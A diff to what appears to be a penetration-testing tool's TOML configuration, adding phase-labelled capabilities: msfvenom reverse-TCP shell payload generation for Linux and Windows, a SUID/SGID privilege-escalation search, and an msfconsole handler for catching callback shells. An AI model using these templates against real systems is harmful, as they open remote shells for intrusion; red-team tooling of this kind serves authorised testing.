@@ -503,3 +503,70 @@ name = "Inspect Database"
 args = ["{path}", ".tables"]
 output = "raw"
 network = false
+
+# ── PAYLOAD ──────────────────────────────────────────────────────────────────
+[[capability]]
+id = "payload.shellcode-generation"
+phase = "payload"
+label = "SHELLCODE GENERATION"
+summary = "Multi-platform shellcode and stager generation"
+inputs = [
+  { key = "target", type = "target", required = true, help = "Listener IP or hostname" },
+  { key = "port", type = "port", required = true, help = "Listener port number" },
+]
+[[capability.provider]]
+binary = "msfvenom"
+subcommand = []
+[[capability.provider.operation]]
+name = "Linux Reverse TCP"
+args = ["-p", "linux/x64/shell_reverse_tcp", "LHOST={target}", "LPORT={port}", "-f", "elf"]
+output = "raw"
+network = true
+[[capability.provider.operation]]
+name = "Windows Reverse TCP"
+args = ["-p", "windows/x64/shell_reverse_tcp", "LHOST={target}", "LPORT={port}", "-f", "exe"]
+output = "raw"
+network = true
+
+# ── ESCALATION ───────────────────────────────────────────────────────────────
+[[capability]]
+id = "escalation.suid-audit"
+phase = "escalation"
+label = "SUID BINARY AUDIT"
+summary = "Audit filesystem for SUID and SGID privilege escalation vectors"
+inputs = [
+  { key = "path", type = "path", required = false, default = "/", help = "Root directory to scan" },
+]
+[[capability.provider]]
+binary = "find"
+subcommand = []
+[[capability.provider.operation]]
+name = "SUID Binaries"
+args = ["{path}", "-perm", "-4000", "-type", "f"]
+output = "lines"
+network = false
+[[capability.provider.operation]]
+name = "SGID Binaries"
+args = ["{path}", "-perm", "-2000", "-type", "f"]
+output = "lines"
+network = false
+
+# ── PERSISTENCE ──────────────────────────────────────────────────────────────
+[[capability]]
+id = "persistence.listener-service"
+phase = "persistence"
+label = "PERSISTENCE HANDLER"
+summary = "Configure persistent staging handlers and listeners"
+inputs = [
+  { key = "target", type = "target", required = true, help = "Local interface or IP to bind" },
+  { key = "port", type = "port", required = true, help = "Local port to listen on" },
+]
+[[capability.provider]]
+binary = "msfconsole"
+subcommand = []
+[[capability.provider.operation]]
+name = "Stager Handler"
+args = ["-q", "-x", "use exploit/multi/handler", "-x", "set LHOST {target}", "-x", "set LPORT {port}"]
+output = "raw"
+network = true
+
